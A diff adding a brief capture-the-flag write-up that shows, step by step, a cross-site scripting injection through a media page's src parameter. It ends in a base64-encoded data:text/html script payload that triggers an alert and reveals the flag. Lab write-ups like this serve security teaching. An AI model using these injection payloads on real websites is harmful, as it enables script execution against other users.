@@ -1,0 +1,33 @@
+On the home page we can see the image NSA which is clickable.
+
+the href url contain that string /?page=media&src=nsa
+
+We try to replace src by html code
+
+/?page=media&src=<h1>hibou</h1>
+
+In the source code the page, we can saw <object data="&lt;h1&gt;Hibou&lt;/h1&gt;"></object>
+
+Object is an html tag for external content (JS, IMAGE)
+
+Let try to inject some HTML with the data: element
+
+https://developer.mozilla.org/fr/docs/Web/URI/Schemes/data
+
+/?page=media&src=&src=data:text/html,%3Ch1%3EHello%2C%20World!%3C%2Fh1%3E
+
+It's work, the html is render
+
+try it with js
+
+/?page=media&src=&src=data:text/html,<script>alert('hibou')</script>
+
+It's work too, but no flag...
+
+Let's try with encoded base 64 data
+
+/?page=media&src=&src=data:text/html;base64,PHNjcmlwdD5hbGVydCgnaGlib3UnKTwvc2NyaXB0Pg==
+
+PHNjcmlwdD5hbGVydCgnaGlib3UnKTwvc2NyaXB0Pg== is <script>alert('hibou')</script> base64 encoded
+
+The flag appear!
